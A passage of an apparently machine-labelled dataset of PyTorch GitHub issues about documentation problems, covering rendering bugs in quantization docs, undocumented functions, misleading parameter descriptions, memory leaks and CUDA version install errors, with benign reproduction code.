src=\"https://user-images.githubusercontent.com/45861273/65708330-30f05c00-e043-11e9-9502-a35464191e19.png\">\r\n"},{"labels":["documentation",null,null],"text":"the parameters for the FakeQuantize function aren't showing up right. \r\n<img width=\"897\" alt=\"Screen Shot 2019-09-25 at 1 12 06 PM\" src=\"https://user-images.githubusercontent.com/45861273/65636145-99353400-df96-11e9-9e0f-4c6b79b7ac91.png\">\r\n"},{"labels":["documentation",null,null],"text":"`torch.add` looks like the following on master.\r\n![image](https://user-images.githubusercontent.com/5652049/65623521-fda3c380-df95-11e9-8c8e-7ad9868af9b7.png)\r\n\r\nIf I am understanding type promotion correctly, we can now add arbitrarily-typed scalars to arbitrarily-typed tensors, so the docs are now incorrect.\r\n\r\ncc @nairbv "},{"labels":[null,null,"documentation",null],"text":"## üöÄ Feature\r\nProvide pytorch traced model graph syntax specification.\r\n\r\n## Motivation\r\nWe plan to deploy pytorch on our inference platform.\r\nSo far the only path is pytorch --> onnx --> target platform.\r\nBut this path may break in sometimes.\r\nWe want to parse pytorch traced model to target platform directly.\r\nWe can see traced model have it's syntax, tokens define, but there's no document can refer.\r\nLike this graph output:\r\ngraph(%x : Tensor) {\r\n  %5 : bool = prim::Constant[value=1]()\r\n  %1 : int = prim::Constant[value=0]()\r\n  %result.1 : Tensor = aten::select(%x, %1, %1)\r\n  %4 : int = aten::size(%x, %1)\r\n  %result : Tensor = prim::Loop(%4, %5, %result.1)\r\n    block0(%i : int, %7 : Tensor) {\r\n      %10 : Tensor = aten::select(%x, %1, %i)\r\n      %result.2 : Tensor = aten::mul(%7, %10)\r\n      -> (%5, %result.2)\r\n    }\r\n  return (%result);\r\n}\r\n\r\nThe tokens, the built-in functions the syntax, without a clear document we can't build a correct parser which support all torch-traced model.\r\n\r\n\r\nThanks\r\n8086\r\n\n\ncc @suo"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/stable/torch.html?highlight=generator#torch._C.Generator\r\n\r\nis called as `torch.Generator`. However it is strange `torch._C.Generator` as user-facing name in docs."},{"labels":["documentation",null,null],"text":"\r\nThe convert function\r\n\r\n`\r\n\r\ndef convert(module, mapping=DEFAULT_MODULE_MAPPING):\r\n    r\"\"\"Converts the float module with observers(where we can get quantization\r\n    parameters) to a quantized module.\r\n    Args:\r\n        module: calibrated module with observers\r\n        mapping: a dictionary that maps from float module type to quantized\r\n           module type, can be overwrritten to allow swapping user defined Modules\r\n    \"\"\"\r\n    reassign = {}\r\n    # TODO(jerryzh): remove after deciding on the impl of intrinsic modules\r\n    SWAPPABLE_MODULES = (nni.ConvBn2d,\r\n                         nni.ConvBnReLU2d,\r\n                         nni.LinearReLU,\r\n                         nni.ConvReLU2d)\r\n\r\n    for name, mod in module.named_children():\r\n        if type(mod) not in SWAPPABLE_MODULES:\r\n            convert(mod, mapping)\r\n        reassign[name] = swap_module(mod, mapping)\r\n\r\n    for key, value in reassign.items():\r\n        module._modules[key] = value\r\n`\r\n\r\nends up looking funny. \r\n\r\n\r\n![Screen Shot 2019-09-19 at 10 07 52 AM](https://user-images.githubusercontent.com/45861273/65265554-0ee85e00-dac6-11e9-843f-03e6d6b3b46a.png)\r\n\r\nI think there are two things here:\r\n\r\n1. do we want to restate the default module mapping in the function args this way? It doesn't seem clear.\r\n\r\n2. the rendering for the function arguments is strange. Is that simply because there isn't an empty  line before args?\r\n\r\n"},{"labels":["documentation",null,null],"text":"the code looks like\r\n\r\ndef add_quant_dequant(module):\r\n    r\"\"\"Wrap the leaf child module in QuantWrapper if it has a valid qconfig\r\n    Note that this function will modify the children of module inplace and it\r\n    can return a new module which wraps the input module as well.\r\n\r\n    Args:\r\n        module: input module with qconfig attributes for all the leaf modules\r\n        that we want to quantize\r\n\r\n    Return:\r\n        Either the inplace modified module with submodules wrapped in\r\n        `QuantWrapper` based on qconfig or a new `QuantWrapper` module which\r\n        wraps the input module, the latter case only happens when the input\r\n        module is a leaf module and we want to quantize it.\r\n    \"\"\"\r\n    if len(module._modules) == 0 and hasattr(module, 'qconfig') and module.qconfig:\r\n        return QuantWrapper(module)\r\n\r\n    for name, child in module.named_children():\r\n        module._modules[name] = add_quant_dequant(child)\r\n    return module\r\n\r\nwhich is rendering strangely here:\r\n\r\n![Screen Shot 2019-09-19 at 10 00 35 AM](https://user-images.githubusercontent.com/45861273/65264949-992fc280-dac4-11e9-88db-ebc0775b47ce.png)\r\n"},{"labels":["documentation",null,null],"text":"the rst file says\r\n\r\ntorch.quantization.observer\r\n---------------------------\r\n.. autoclass:: ObserverBase\r\n.. autofunction::  _calculate_qparams\r\n.. autoclass:: MinMaxObserver\r\n\r\n\r\n\r\nthe .py file says\r\n\r\n\r\nclass ObserverBase(ABC, nn.Module):\r\n    r\"\"\"Observer base Module\r\n    Any concrete observer implementation should derive from this class.\r\n\r\n    Concrete observers should follow the same API. In forward, they will update\r\n    the statistics of the observed Tensor. And they should provide a\r\n    `calculate_qparams` function that computes the quantization parameters given\r\n    the collected statistics.\r\n    \"\"\"\r\n\r\n\r\nso I would expect to see doc here:\r\n\r\n\r\n\r\n![Screen Shot 2019-09-19 at 8 55 59 AM](https://user-images.githubusercontent.com/45861273/65260635-85cc2980-dabb-11e9-8bf4-bfbff5620771.png)\r\n"},{"labels":[null,"documentation",null,null,null],"text":"## üìö Documentation\r\n\r\nTraining a model with `torch.autograd.set_detect_anomaly(True)` causes a severe memory leak because every line of code that is executed is stored in memory as a string. As far I as know, this memory leak isn't documented anywhere. The documentation for `set_detect_anomaly` should be updated with a warning.\n\ncc @ezyang @gchanan @zou3519"},{"labels":[null,"documentation",null,null],"text":"# I want to generate a static library file that calls libtorchÔºå but report errors:\r\n‚Äútorch/script.h‚Äù: No such file or dire\r\n# My CMakeLists.txt is:\r\ncmake_minimum_required(VERSION 3.12 FATAL_ERROR)\r\nproject(detector )\r\nset( CMAKE_CXX_FLAGS \"-std=c++11\" )\r\nfind_package(Torch REQUIRED)\r\ninclude_directories( ${Torch_INCLUDE_DIRS} )\r\ninclude_directories(D:\\\\libtorch\\\\include\\\\torch)\r\nmessage(STATUS \"Pytorch status:\")\r\nmessage(STATUS \"    libraries: ${TORCH_LIBRARIES}\")\r\nmessage(STATUS \"    include_dirs: ${Torch_INCLUDE_DIRS}\")\r\nadd_library(detector src/detector.cpp)\r\n# Run the following command:\r\ncmake -DCMAKE_PREFIX_PATH=D:\\libtorch ..\r\nIn the output information, {Torch_INCLUDE_DIRS} is None.\r\ncmake --build .\r\nreport error: ‚Äútorch/script.h‚Äù: No such file or dire\r\n\r\nIs my cmake file wrong? \r\nHope get your help, thanks!\r\n\n\ncc @peterjc123"},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\nThe documentation for F.dropout should probably mention that putting the model in eval mode doesn't disable dropout.\r\n\r\nA small example\r\n```python\r\nimport torch\r\nimport torch.nn as nn\r\nimport torch.nn.functional as F\r\n\r\nclass Net(nn.Module):\r\n    def __init__(self):\r\n        super(Net, self).__init__()\r\n\r\n    def forward(self, x):\r\n        x = F.dropout(x)\r\n        return x\r\n\r\nnet = Net()                                                             \r\n\r\na = torch.ones(10)                                                     \r\n\r\nnet(a)                                                                  \r\ntensor([0., 0., 0., 2., 2., 2., 0., 0., 2., 2.]) \r\n\r\nnet.eval()\r\n\r\nnet(a)\r\ntensor([0., 0., 0., 2., 2., 2., 0., 0., 2., 2.])\r\n\r\n\r\n```\r\n\r\nIf the model is set in eval mode, the dropout layer is not disabled.\r\nis_training should take care of this.. But it may be better if this behavior is explicitly mentioned in the docs.\r\n"},{"labels":[null,"documentation",null,null],"text":"Here is how I was thinking we would organize the quantization documentation .. primarily so that the quantization stuff all ends up together but is navigable from places like \"nn\" where some of the functions end up. \r\n\r\nFirst, here is what the early preview looks like .. as a baseline\r\n![what it looks like now](https://user-images.githubusercontent.com/45861273/64991361-96478e80-d886-11e9-9b36-ee5ecd02f74d.png)\r\n\r\nThen here is how I would change that page (mostly the navigation)\r\n![MOck up 1](https://user-images.githubusercontent.com/45861273/64991381-a19aba00-d886-11e9-905f-50430af9d223.png)\r\n\r\nThen here is how I would add a section to the .nn section linking back to the quantization doc. \r\n\r\n![In other places where the code lives like nn](https://user-images.githubusercontent.com/45861273/64991407-a9f2f500-d886-11e9-96e3-4a00998279f3.png)\r\n\r\n\n\ncc @ezyang"},{"labels":["documentation",null,null],"text":"## üêõ Bug\r\n\r\nLooking at a preview of the sphinx generated documentation and the list of modules that can be fused is not clear. Perhaps some list notation or other punctuation would help. \r\n\r\nFuses only the following sequence of modules: conv, bn conv, bn, relu All other sequences are left unchanged.\r\n\r\nMissing some kind of separator between the first sequence and the second sequence. I think it is missing a period at the end of the sentence as well. \r\n\r\n\r\n\r\nI think the items that are fused are\r\nconv, bn\r\nconf, bn, relu\r\n\r\ndoes it also fuse \r\nconv, relu\r\n\r\n?\r\n\r\n![Screen Shot 2019-09-16 at 1 12 02 PM](https://user-images.githubusercontent.com/45861273/64990209-364fe880-d884-11e9-81e1-33bcc93b11f8.png)\r\n\r\n## To Reproduce\r\n\r\nJessica and Bruce did an early doc build for us. \r\n\r\n\r\n"},{"labels":["documentation",null,null],"text":"Just simple question, does PyTorch 1.2 support autograd on sparse multiplication or not yet, like sparse times dense? I see there are some open issues tracking the support for sparse tensors, like\r\n\r\nhttps://github.com/pytorch/pytorch/issues/2389\r\nhttps://github.com/pytorch/pytorch/issues/3158\r\nhttps://github.com/pytorch/pytorch/issues/8853\r\n\r\nBut I get lost after reading all these."},{"labels":["documentation",null],"text":"## üêõ Bug\r\n\r\nGPU memory can't be released when using a try-except statement for CUDA out of memory.\r\n\r\n## To Reproduce\r\n\r\n```\r\nimport gc\r\nimport numpy as np\r\nimport torch\r\nimport torch.nn as nn\r\n\r\nclass MyModel(nn.Module):\r\n    def __init__(self, *embeddings):\r\n        super(MyModel, self).__init__()\r\n        self.embeddings = nn.ModuleList()\r\n        for embedding in embeddings:\r\n            embedding = torch.as_tensor(embedding)\r\n            embedding = nn.Embedding.from_pretrained(embedding, freeze=True)\r\n            self.embeddings.append(embedding)\r\n\r\ndevice = \"cuda\"\r\nembeddings = [np.zeros((5000000, 1000))] * 3\r\nmodel = MyModel(*embeddings)\r\n\r\ntry:\r\n    model = model.to(device)\r\nexcept RuntimeError: # CUDA out of memory\r\n    print(\"GPU memory overflow. Use CPU instead.\")\r\n    del model\r\n    gc.collect()\r\n    torch.cuda.empty_cache()\r\n```\r\n\r\n## Expected behavior\r\n\r\nWhen `MyModel` is a single layer like `torch.nn.Linear`, the code releases most GPU memory and results in about 900MB in nvidia-smi.\r\n\r\nWhen `MyModel` is a custom model like the above module list, no GPU memory is released and it results in about 10GB in nvidia-smi.\r\n\r\n## Environment\r\n\r\nPyTorch version: 1.1.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.0.130\r\n\r\nOS: CentOS Linux release 7.6.1810 (Core)\r\nGCC version: (GCC) 7.3.0\r\nCMake version: version 3.14.5\r\n\r\nPython version: 3.7\r\nIs CUDA available: Yes\r\nCUDA runtime version: 10.0.130\r\nGPU models and configuration:\r\nGPU 0: Tesla V100-SXM2-16GB\r\nGPU 1: Tesla V100-SXM2-16GB\r\nGPU 2: Tesla V100-SXM2-16GB\r\nGPU 3: Tesla V100-SXM2-16GB\r\n\r\nNvidia driver version: 418.67\r\ncuDNN version: Could not collect\r\n\r\nVersions of relevant libraries:\r\n[pip] numpy==1.16.4\r\n[pip] torch==1.1.0\r\n[pip] torchbiggraph==1.dev1\r\n[pip] torchvision==0.3.0\r\n[conda] mkl                       2019.4                      243\r\n[conda] pytorch                   1.1.0           py3.7_cuda10.0.130_cudnn7.5.1_0    pytorch\r\n[conda] torchbiggraph             1.dev1                    <pip>\r\n[conda] torchvision               0.3.0           py37_cu10.0.130_1    pytorch\r\n"},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\n\r\nThe [documentation for the negative binomial distribution](https://pytorch.org/docs/stable/_modules/torch/distributions/negative_binomial.html) is ambiguous. \r\n\r\nThe wording implies that PyTorch's negative binomial distribution describes the total number of trials before a set number of failures occurs. Really, it describes the total number of *successful* trials before a set number of failures occurs. \r\n\r\nSince negative binomial distributions can be parameterized a bunch of different ways ([see Wikipedia](https://en.wikipedia.org/wiki/Negative_binomial_distribution#Alternative_formulations)), I think PyTorch's docs should be more explicit. Also, PyTorch's negative binomial parameterization is different than [SciPy](https://docs.scipy.org/doc/scipy/reference/generated/scipy.stats.nbinom.html) and also different than Wikipedia, so being extra clear can't hurt.\r\n\r\nI made #25923 to clarify the docstring and describe what PyTorch's implementation is doing. \r\n\n\ncc @vincentqb @fritzo @neerajprad @alicanb @vishwakftw"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nBased on #25706, [toDense](https://pytorch.org/docs/stable/sparse.html#torch.sparse.FloatTensor.toDense) was a typo for [to_dense](https://github.com/pytorch/pytorch/blob/5d3267cd303817e0097a833bbd3f59be35295441/aten/src/ATen/core/TensorBody.h#L702) method but the doc building did not fail. \r\n\r\ncc: @ezyang "},{"labels":[null,null,"documentation",null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nAfter the 1.2 version of pytorch release, the torch::Tensor docs(original url:https://pytorch.org/cppdocs/api/classat_1_1_tensor.html) is missing. it does provide much helpful information about class torch::Tensor. \r\n\r\nIt was there. (https://github.com/pytorch/cppdocs/blob/59620f68901b1e5f6bc2fa30c9ecbe8d0d86a1c4/api/classat_1_1_tensor.html) but in the latest commit, the file is absent.\r\n\r\nIt is really helpful for c++ development. Could you recovery it?\r\n\n\ncc @ezyang @gchanan @zou3519 @yf225"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\nHi,\r\n\r\nIn the [source doc of torch.set_default_tensor_type(t)](https://pytorch.org/docs/stable/_modules/torch.html#set_default_tensor_type), the argument `t` defined using `:attr:` tag but in the [compiled doc of torch.set_default_tensor_type(t)](https://pytorch.org/docs/stable/torch.html#torch.set_default_tensor_type), the `t` argument in the description, refers to [torch.t()](https://pytorch.org/docs/stable/torch.html#torch.t) (transpose) function inaccurately.\r\nI think the source doc is right but I have no idea how the `attr` tag is refering to `func`."},{"labels":["documentation",null],"text":"My IDE gets confused on `output.backward(retain_graph=True)`\r\nBecause `torch/__init__.pyi` (PyTorch 1.2) has the following, `retain_graph` kwarg is missing\r\n\r\n```\r\n    def backward(self, gradient: Optional[Tensor]=None, keep_graph: _bool=False, create_graph: _bool=False) -> None: ...\r\n```\r\n"},{"labels":["documentation",null,null,null],"text":"https://pytorch.org/docs/stable/sparse.html#torch.sparse.FloatTensor.toDense\r\n\r\nIt's not toDense, it's `to_dense`\r\n"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\nHi everyone,\r\nI found that the math formulas of \"torch.nn.init.kaiming_uniform_\" and \"torch.nn.init.kaiming_normal_\" are not general enough.\r\nThe complete formula for \"kaiming_uniform_\" should be \r\n\r\n> \\text{bound} = \\text{gain} * \\sqrt{\\frac{3}{\\text{fan}}}\r\n> where gain is gottn from \"calculate_gain\"\r\n\r\nAm I right?\r\n\r\nhttps://pytorch.org/docs/stable/nn.init.html#torch.nn.init.kaiming_uniform_\r\nhttps://pytorch.org/docs/stable/nn.init.html#torch.nn.init.kaiming_normal_"},{"labels":["documentation",null,null,null],"text":"## üìö Documentation\r\n\r\nThe documentation for `pad_packed_sequence` says \"Batch elements will be ordered decreasingly by their length.\", but that's not true if the packed sequence is created with `enforce_sorted=False`. (It was true before the introduction of `enforce_sorted=False`)\r\n\r\nRather, another statement in the documentation \"It is an inverse operation to pack_padded_sequence()\" is true - the returned tensor is in the same order as it was before being packed.\r\n\r\nTo fix this, simply remove the sentence \"Batch elements will be ordered decreasingly by their length.\".\r\n\n\ncc @zou3519"},{"labels":[null,"documentation",null,null],"text":"## Issue description\r\n\r\n[The instructions on the \"Start Locally\" page](https://pytorch.org/get-started/locally/#linux-from-source) seem to indicate Cuda 8.0 is supported here:\r\n\r\n```sh\r\n# Add LAPACK support for the GPU\r\nconda install -c pytorch magma-cuda80 # or magma-cuda90 if CUDA 9\r\n```\r\n\r\nHowever, when I run the commands specified, I get the following output from `python setup.py install`:\r\n\r\n```\r\n-- Caffe2: CUDA detected: 8.0\r\n-- Caffe2: CUDA nvcc is: /usr/local/cuda/bin/nvcc\r\n-- Caffe2: CUDA toolkit directory: /usr/local/cuda\r\nCMake Error at cmake/public/cuda.cmake:42 (message):\r\n  PyTorch requires CUDA 9.0 and above.\r\nCall Stack (most recent call first):\r\n  cmake/Dependencies.cmake:808 (include)\r\n  CMakeLists.txt:311 (include)\r\n```\r\n\r\nUnless I am missing something, it appears the documentation has fallen out of sync with the latest build. I would love to be told I am wrong and have simply missed a step somewhere, but if Cuda 8.0 is truly no longer supported then, in my opinion, the instructions should be updated to reflect that.\r\n\r\n## System Info\r\n\r\n```\r\nPyTorch version: N/A\r\nIs debug build: N/A\r\nCUDA used to build PyTorch: N/A\r\n\r\nOS: CentOS Linux 7 (Core)\r\nGCC version: (GCC) 4.8.5 20150623 (Red Hat 4.8.5-36)\r\nCMake version: version 3.14.0\r\n\r\nPython version: 3.7\r\nIs CUDA available: N/A\r\nCUDA runtime version: 8.0.61\r\nGPU models and configuration: GPU 0: Tesla C2075\r\nNvidia driver version: 390.87\r\ncuDNN version: Could not collect\r\n\r\nVersions of relevant libraries:\r\n[pip] numpy==1.16.4\r\n[conda] blas                      1.0                         mkl  \r\n[conda] magma-cuda80              2.3.0                         1    pytorch\r\n[conda] mkl                       2019.4                      243  \r\n[conda] mkl-include               2019.4                      243  \r\n[conda] mkl-service               2.0.2            py37h7b6447c_0  \r\n[conda] mkl_fft                   1.0.14           py37ha843d7b_0  \r\n[conda] mkl_random                1.0.2            py37hd81dba3_0\r\n```\r\n\r\nAdditional note: [The instructions for installing the build for 8.0](https://pytorch.org/get-started/locally/#cuda-8x) work on my system, but I am unable to move things into GPU and receive a warning that my GPU is not supported. I suspect this is because my card does not support CuDNN and the default installation for Cuda 8.0 uses CuDNN."},{"labels":["documentation",null],"text":"I searched for all occurrences of RegisterOperators and there are no occurrences of this string in docs."},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\n\r\npolygamma appears undocumented\r\n\r\n```\r\n>>> import torch\r\n>>> torch.polygamma\r\n<built-in method polygamma of type object at 0x7f3dc98fc8a0>\r\n>>> help(torch.polygamma)\r\nHelp on built-in function polygamma:\r\n\r\npolygamma(...)\r\n```\r\n\r\nYes [the docs](https://pytorch.org/docs/master/search.html?q=polygamma&check_keywords=yes&area=default) don't seem to mention it.\r\n\r\nIt's also not in our [docs file](https://github.com/pytorch/pytorch/blob/687aa781dfafca0e182560806cc0437007911493/torch/_tensor_docs.py).\n\ncc @vincentqb @fritzo @neerajprad @alicanb @vishwakftw"},{"labels":["documentation",null],"text":"## üöÄ Feature\r\n<!-- A clear and concise description of the feature proposal -->\r\n5-10 minute long simulations before beginning of every tutorial in PyTorch docs.\r\n\r\n## Motivation\r\n<!-- Please outline the motivation for the proposal. Is your feature request related to a problem? e.g., I'm always frustrated when [...]. If this is related to another GitHub issue, please link here too -->\r\n\r\njust like this simulation\r\nhttps://www.youtube.com/watch?v=u7x8RXwLKcA\r\nand\r\nhttps://www.youtube.com/watch?v=auRPXMMHJzc\r\nmore simulations before tutorials\r\n\r\n## Pitch\r\n\r\n<!-- A clear and concise description of what you want to happen. -->\r\n\r\n## Alternatives\r\n\r\n<!-- A clear and concise description of any alternative solutions or features you've considered, if any. -->\r\n\r\n## Additional context\r\n\r\n<!-- Add any other context or screenshots about the feature request here. -->\r\n"},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\n\r\nAs done in [tensorflow](https://github.com/tensorflow/datasets#disclaimers), let's add a dataset disclaimer.\r\n\r\n- [x] torchvision pytorch/vision#1249\r\n- [x] torchtext pytorch/text#590\r\n- [x] torchaudio pytorch/audio#247\r\n\r\ncc @SsnL @zhangguanheng66 @fmassa @cpuhrsch "},{"labels":[null,"documentation",null],"text":"## üêõ Bug\r\n\r\nWhen I create a Normal distribution with uninitialised parameters and initialise them before use they stay fixed. I'm not sure whether this it expected but I found it to be odd and took me some time to catch the difference in initialisations (because this then also lead to samples that were `inf`).\r\n\r\n## To Reproduce\r\n\r\n```\r\nimport torch\r\nimport torch.nn as nn\r\nfrom torch.nn.parameter import Parameter\r\nimport torch.distributions as dist\r\nimport math\r\n\r\nmean = Parameter(torch.Tensor(1, 2))\r\nlog_std = Parameter(torch.Tensor(1, 2))\r\n\r\nn = dist.Normal(mean, torch.exp(log_std))\r\n\r\nnn.init.kaiming_uniform_(mean, a=math.sqrt(5))\r\nnn.init.normal_(log_std, -5)\r\n\r\nprint(n.scale)\r\n```\r\nreturns\r\n`tensor([[1., 1.]], grad_fn=<ExpBackward>)`\r\n## Expected behavior\r\n\r\nWhen initialising the parameters before creating the distribution the scale is correct:\r\n```\r\nimport torch\r\nimport torch.nn as nn\r\nfrom torch.nn.parameter import Parameter\r\nimport torch.distributions as dist\r\nimport math\r\n\r\nmean = Parameter(torch.Tensor(1, 2))\r\nlog_std = Parameter(torch.Tensor(1, 2))\r\n\r\nnn.init.kaiming_uniform_(mean, a=math.sqrt(5))\r\nnn.init.normal_(log_std, -5)\r\n\r\nn = dist.Normal(mean, torch.exp(log_std))\r\n\r\nprint(n.scale)\r\n```\r\nreturns:\r\n`tensor([[0.0444, 0.0060]], grad_fn=<ExpBackward>)`\r\n\r\n## Environment\r\n\r\nCollecting environment information...\r\nPyTorch version: 1.1.0.post2\r\nIs debug build: No\r\nCUDA used to build PyTorch: None\r\n\r\nOS: Mac OSX 10.14.5\r\nGCC version: Could not collect\r\nCMake version: Could not collect\r\n\r\nPython version: 3.7\r\nIs CUDA available: No\r\nCUDA runtime version: No CUDA\r\nGPU models and configuration: No CUDA\r\nNvidia driver version: No CUDA\r\ncuDNN version: No CUDA\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.15.1\r\n[pip3] numpydoc==0.8.0\r\n[pip3] torch==1.1.0.post2\r\n[conda] blas                      1.0                         mkl\r\n[conda] mkl                       2019.0                      118\r\n[conda] mkl-service               1.1.2            py37h6b9c3cc_5\r\n[conda] mkl_fft                   1.0.4            py37h5d10147_1\r\n[conda] mkl_random                1.0.1            py37h5d10147_1\r\n[conda] torch                     1.1.0.post2               <pip>\r\n\r\n## Additional context\r\nN/A\r\n"},{"labels":[null,"documentation",null,null],"text":"The Transformer implementation docs (https://pytorch.org/docs/stable/nn.html?highlight=transformer#torch.nn.Transformer) state that they implement the original paper but fail to acknowledge that they don‚Äôt implement the following: \r\n* Layer Norm as the default normalization option. \r\n* Positional Encodings\r\n* Embeddings before the encoding and decoding step \r\n\r\nIt‚Äôs fine that these are all not implemented directly in the module but making it more clear that they aren‚Äôt and were in the original paper would be helpful. "},{"labels":["documentation",null,null],"text":"See https://github.com/pytorch/pytorch/issues/24380#issuecomment-522294803\r\n"},{"labels":[null,null,"documentation",null],"text":"It seems that the LibTorch download links on the PyTorch website are wrong for both Linux and Mac. When selecting Stable(1.2) the provided link points to nightly builds; specifically nightly latest, which will currently download a 1.3 dev build.\r\n\r\n### Example download configuration:\r\n![Screen Shot 2019-08-14 at 9 00 17 PM](https://user-images.githubusercontent.com/30844227/63067898-bc1ff300-bed6-11e9-9d9f-4b072342da3b.png)\r\n\r\n### Contents of build-version file:\r\n`1.3.0.dev20190814+cpu`\r\n\n\ncc @ezyang @gchanan"},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\nBased on these two docs:\r\nhttps://pytorch.org/docs/stable/distributed.html#torch.distributed.init_process_group\r\nhttps://pytorch.org/tutorials/intermediate/dist_tuto.html\r\n\r\nFor function `init_process_group`, the parameter `world_size` and `rank` are optional. They are only required if `store` is specified. \r\n\r\nWhen I tried it out, this function will throw an error for missing those two parameters even if I am not using `store`. \r\n\r\nThe code that produces this error is as below: \r\n`dist.init_process_group('nccl', init_method='file:///philly/wu3/ipgsp/xuzhu/torch_dist/ips')`\r\n\r\nThe error message is as below:\r\n[1,6]<stderr>:  File \"/philly/wu3/ipgsp/xuzhu/torch_dist/torch_dist_run2.py\", line 59, in <module>\r\n[1,6]<stderr>:    dist.init_process_group('nccl', init_method='file:///philly/wu3/ipgsp/xuzhu/torch_dist/ips')\r\n[1,6]<stderr>:  File \"/opt/conda/lib/python3.6/site-packages/torch/distributed/distributed_c10d.py\", line 406, in init_process_group\r\n[1,6]<stderr>:    store, rank, world_size = next(rendezvous(url))\r\n[1,6]<stderr>:  File \"/opt/conda/lib/python3.6/site-packages/torch/distributed/rendezvous.py\", line 66, in _file_rendezvous_handler\r\n[1,6]<stderr>:    raise _error(\"rank parameter missing\")\r\n[1,6]<stderr>:   ValueError: Error initializing torch.distributed using file:// rendezvous: rank parameter missing\r\n\r\nEven I supply with a rank, it will then complain about work_size is missing.\r\n\r\nSo without `store` being used, those two parameters are not optional still. Missing them in the script would cause an error.\r\n"},{"labels":[null,"documentation",null],"text":"## üêõ Bug\r\nWhen installing pytorch with conda in a new environment, it always installs compiled with the cuda version 10 and cudatoolkit=10.0. Whether I conda install pytorch 1.2, 1.1, 1.0.1, or 1.0 with cuda90 it always tries to install the cuda 10 version of the package as well as cudatoolkit=10.0. This is via the pytorch conda channel. My machine has an older driver version that can't easily be upgraded. I also tried pip installing from https://download.pytorch.org/whl/cu90/stable and it still insists on using cuda 10.\r\n\r\n## To Reproduce\r\nconda create --name test_env python=3.6\r\nconda activate test_env\r\nconda install pytorch=1.1 cuda90 -c pytorch\r\nconda list\r\n\r\nIn python when you run torch.version.cuda it also lists cuda 10.\r\n\r\nThe following NEW packages will be INSTALLED:\r\n\r\n    blas:           1.0-mkl\r\n    cffi:           1.12.3-py36h2e261b9_0\r\n    cuda90:         1.0-h6433d27_0                        pytorch\r\n    cudatoolkit:    10.0.130-0\r\n    intel-openmp:   2019.4-243\r\n    libgfortran-ng: 7.3.0-hdf63c60_0\r\n    mkl:            2019.4-243\r\n    mkl_fft:        1.0.12-py36ha843d7b_0\r\n    mkl_random:     1.0.2-py36hd81dba3_0\r\n    ninja:          1.9.0-py36hfd86e86_0\r\n    numpy:          1.16.4-py36h7e9f1db_0\r\n    numpy-base:     1.16.4-py36hde5b4d6_0\r\n    pycparser:      2.19-py36_0\r\n    pytorch:        1.1.0-py3.6_cuda10.0.130_cudnn7.5.1_0 pytorch\r\n\r\nProceed ([y]/n)? n\r\n\r\n## Expected behavior\r\n\r\nShould be able to select the cuda version.\r\n\r\n## Environment\r\n\r\nCollecting environment information...\r\nPyTorch version: N/A\r\nIs debug build: N/A\r\nCUDA used to build PyTorch: N/A\r\n\r\nOS: Ubuntu 16.04.3 LTS\r\nGCC version: (Ubuntu 5.4.0-6ubuntu1~16.04.10) 5.4.0 20160609\r\nCMake version: version 3.5.1\r\n\r\nPython version: 3.6\r\nIs CUDA available: N/A\r\nCUDA runtime version: Could not collect\r\nGPU models and configuration:\r\nGPU 0: TITAN Xp\r\nGPU 1: TITAN Xp\r\nGPU 2: TITAN Xp\r\nGPU 3: TITAN Xp\r\n\r\nNvidia driver version: 390.67\r\ncuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.1.3\r\n\r\nVersions of relevant libraries:\r\n[pip] Could not collect\r\n[conda] Could not collect\r\n\r\n"},{"labels":["documentation",null,null],"text":"A proposal: add `_t` and `_{t+1}` (or `_{t-1}`) indices in appropriate places. It will be clearer what's happening and more aligned to the formulas typically used in optimization papers.\r\n\r\nCurrently: `v=œÅ‚àóv+g`\r\n\r\nProposed: `v_{t+1}=œÅ‚àóv_{t}+g_{t+1}`\r\n\r\nhttps://pytorch.org/docs/master/optim.html?highlight=sgd#torch.optim.SGD"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\nOur friends at Google (specifically, Android) have built a wasdwebassemblyl-based tracing tool at https://ui.perfetto.dev/#!/viewer (source code to manually trace at https://android.googlesource.com/platform/external/perfetto/+/refs/heads/master/test/client_api_example.cc).\r\n\r\nI think PyTorch could make use of that, or at least point to it in its documentation?\r\n\r\nExample of uploaded trace: https://ui.perfetto.dev/#!/?s=c33b3f7ea24e145ed13a52196e1eb5e121334d53c7de6cedead7387a5f3c72"},{"labels":["documentation"],"text":"## üìö Documentation\r\nThe documentation of [`Tensor.add_()`](https://pytorch.org/docs/stable/tensors.html#torch.Tensor.add_) says that it is an in-place version of `add()`, which in turn refer to [`torch.add()`](https://pytorch.org/docs/stable/torch.html#torch.add). However, at no place does it say that the result is scaled by an optional second argument.\r\nThat is `a.add_(10,b)` equals `a += 10 * b` where `a` and `b` are tensors."},{"labels":[null,"documentation",null,null],"text":"## üöÄ Feature\r\n<!-- A clear and concise description of the feature proposal -->\r\nRather than or in addition to having dependencies as submodules, it would also be helpful to list them separately, indicating typical configurations and allowing the user the option of informing cmake where the dependencies are installed.\r\n\r\n## Motivation\r\n\r\n<!-- Please outline the motivation for the proposal. Is your feature request related to a problem? e.g., 